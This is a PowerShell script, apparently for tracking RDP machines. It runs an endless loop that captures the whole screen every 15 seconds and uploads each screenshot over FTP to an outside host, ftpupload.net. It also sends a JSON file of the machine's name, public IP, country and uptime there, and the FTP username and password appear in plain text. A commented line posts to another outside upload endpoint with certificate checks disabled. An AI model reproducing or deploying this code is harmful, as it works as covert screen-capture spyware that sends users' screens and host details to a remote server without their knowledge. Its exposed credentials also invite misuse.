$ip_count = 0;
$ip;
$c_code;
while (1) {
    $Root = "$PSScriptRoot\";
    $type = ".kld";
    $output = @();
    $ss_img;$id_name_old;$id_name_new;$id;


    # Foreach ($type in $FileType) {
        $files = Get-ChildItem $Root -Filter *$type -Recurse | ? { !$_.PSIsContainer }
        # $output += "$type ---> $($files.Count) files"
        foreach ($file in $files) {
            $output += $file.Name
        }
    # }

    # echo $output.Count;
    # echo $output;

    if($output.Count -eq 1){
        $id_name_old = $output[0] -replace ".{4}$"
        echo $id_name_old;
        $ss_img = $id_name_old;
        $id = $id_name_old;
    }else{
        
        $id_name = "0123456789ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz".tochararray();
        $id_name_new = ($id_name | Get-Random -count 18) -join '';
        echo $id_name_new;
        $ss_img = $id_name_new;
        $id = $id_name_new;
        Set-Content "$PSScriptRoot\$id_name_new.kld" "KSP";
    }




    $path = "$PSScriptRoot\$ss_img.png"
    echo $path

    # $targetDir = 'c:\foo\bar' 
    # $res = Start-Process -Wait -FilePath "$PSScriptRoot\Nircmd.exe" -Verb RunAs -ArgumentList "savescreenshotfull", "$path"
    # echo $res
    # $File = "\\SomeLocation\SomeDirectory\MyFancyScreenshot.bmp"
    $File = $path;
    Add-Type -AssemblyName System.Windows.Forms
    Add-type -AssemblyName System.Drawing
    #ysteher Screen resolution information
    $Screen = [System.Windows.Forms.SystemInformation]::VirtualScreen
    $width = $Screen.width
    $Height = $Screen.Height
    $Left = $Screen.Left
    $Top = $Screen.Top
    # Create bitmap using the top-left and bottom-right bounds
    $bitmap = New-Object System.Drawing.Bitmap $Width, $Height
    # Create Graphics object
    $graphic = [System.Drawing.Graphics]::FromImage($bitmap)
    # Capture screen
    $graphic.CopyFromScreen($Left, $Top, 0, 0, $bitmap.Size)
    # Save to file
    $bitmap.Save($File) 
    Write-Output "Screenshot saved to:"
    Write-Output $File

    # Start-Process "$PSScriptRoot\Nircmd.exe" savescreenshotfull "$path" -NoNewWindow -Wait
    # Param([String]$pe)
    # $path = "$PSScriptRoot\Screenshot.png"
    
    # $img_up = [System.Net.ServicePointManager]::ServerCertificateValidationCallback = {$true}; $http = new-object System.Net.WebClient; $response = $http.UploadFile("http://ksp-rdps.rf.gd/upload.php","$path");
    # $img_up = [System.Net.ServicePointManager]::ServerCertificateValidationCallback = {$true}; $http = new-object System.Net.WebClient; $response = $http.UploadFile("http://localhost/upload.php","$path");
    # $img_src = "";
    
    # create the FtpWebRequest and configure it
    $ftp = [System.Net.FtpWebRequest]::Create("ftp://ftpupload.net/htdocs/uploads/$ss_img.png")
    $ftp = [System.Net.FtpWebRequest]$ftp
    $ftp.Method = [System.Net.WebRequestMethods+Ftp]::UploadFile
    $ftp.Credentials = new-object System.Net.NetworkCredential("epiz_32282489","aMMu542543")
    $ftp.UseBinary = $true
    $ftp.UsePassive = $true
    # read in the file to upload as a byte array
    $content = [System.IO.File]::ReadAllBytes("$path")
    $ftp.ContentLength = $content.Length
    # get the request stream, and write the bytes into it
    $rs = $ftp.GetRequestStream()
    $rs.Write($content, 0, $content.Length)
    # be sure to clean up after ourselves
    $rs.Close()
    $rs.Dispose()
    
    echo "Upload Done";

    # $img_src = [convert]::ToBase64String((get-content $path -encoding byte))

    $time = (Get-Date).ToString("h:m:s tt");
    $date = (Get-Date).ToString("d-MMM-yy");
    $datetimeUTC = (Get-Date).ToUniversalTime().ToString("yyyy-MM-ddTHH:mm:ss.fffK");

    if($ip_count -lt 3){
        $ip_info = Invoke-RestMethod -Uri ('http://ipinfo.io/'+(Invoke-WebRequest -uri "http://ifconfig.me/ip").Content);
        $global:ip = $ip_info.ip;
        $global:c_code = $ip_info.country;
        $global:ip_count++;
        echo "ip $ip_count";
    }else{

    }
    $pc_name = [system.environment]::MachineName;

    $uptime = (get-date) - (gcim Win32_OperatingSystem).LastBootUpTime;
    
    $d = (&{If($($uptime.days) -lt 1) {""} Else {"$($uptime.days)d, "}});
    $h = (&{If($($uptime.Hours) -lt 1) {""} Else {"$($uptime.Hours)h, "}});
    $m = (&{If($($uptime.Minutes) -lt 1) {""} Else {"$($uptime.Minutes)m, "}});
    $s = (&{If($($uptime.Seconds) -lt 1) {""} Else {"$($uptime.Seconds)s, "}});
    # (IIf () "" "");

    $uptime = "$d$h$m$s";

    echo $uptime;
    
    # $rdp_data_json = Get-Content 'D:\rdp\rdp_data.json' -raw | ConvertFrom-Json
    $rdp_data_json = Get-Content "$PSScriptRoot\rdp_data.json" -raw | ConvertFrom-Json
    
    $chk_new = "new";

    $new_pc = 
    '{
        "id":  "'+$id+'",
        "name":  "'+$pc_name+'",
        "ip":  "'+$ip+'",
        "c_code":  "'+$c_code+'",
        "img_src":  "'+$ss_img+'.png",
        "ltime":  "'+$time+'",
        "ldate":  "'+$date+'",
        "ftd":  "'+$uptime+'",
        "dtUTC":  "'+$datetimeUTC+'"
    }';

    
    # $new_pc = 
    # '{
    #     "id":  "$id",
    #     "name":  "$pc_name",
    #     "ip":  "$ip",
    #     "c_code":  "$c_code",
    #     "img_src":  "$ss_img.png",
    #     "ltime":  "$time",
    #     "ldate":  "$date",
    #     "ftd":  "$uptime",
    #     "dtUTC":  "$datetimeUTC"
    # }';

    $rdp_data_json | % {
        if($_.id -eq $id){
            # $_.id="naaaa";
            $_.name = "$pc_name";
            $_.ip = "$ip";
            $_.c_code = "$c_code";
            $_.img_src = "$ss_img.png";
            $_.ltime = "$time";
            $_.ldate = "$date";
            $_.ftd = "$uptime";
            $_.dtUTC = "$datetimeUTC";



            $chk_new = "old";
        }
    }
    if($chk_new -eq "new"){
        $rdp_data_json += (ConvertFrom-Json -InputObject $new_pc);
    }
    $rdp_data_json | ConvertTo-Json -depth 32| set-content "$PSScriptRoot\rdp_data.json"


    # $path = "$PSScriptRoot\rdp_data.json"
    # create the FtpWebRequest and configure it
    $ftp = [System.Net.FtpWebRequest]::Create("ftp://ftpupload.net/htdocs/rdp_data.json")
    $ftp = [System.Net.FtpWebRequest]$ftp
    $ftp.Method = [System.Net.WebRequestMethods+Ftp]::UploadFile
    $ftp.Credentials = new-object System.Net.NetworkCredential("epiz_32282489","aMMu542543")
    $ftp.UseBinary = $true
    $ftp.UsePassive = $true
    # read in the file to upload as a byte array
    $content = [System.IO.File]::ReadAllBytes("$PSScriptRoot\rdp_data.json")
    $ftp.ContentLength = $content.Length
    # get the request stream, and write the bytes into it
    $rs = $ftp.GetRequestStream()
    $rs.Write($content, 0, $content.Length)
    # be sure to clean up after ourselves
    $rs.Close()
    $rs.Dispose()


    Start-Sleep -Seconds 15

    # f007398ec7bd997ff8990dc125815ba7
}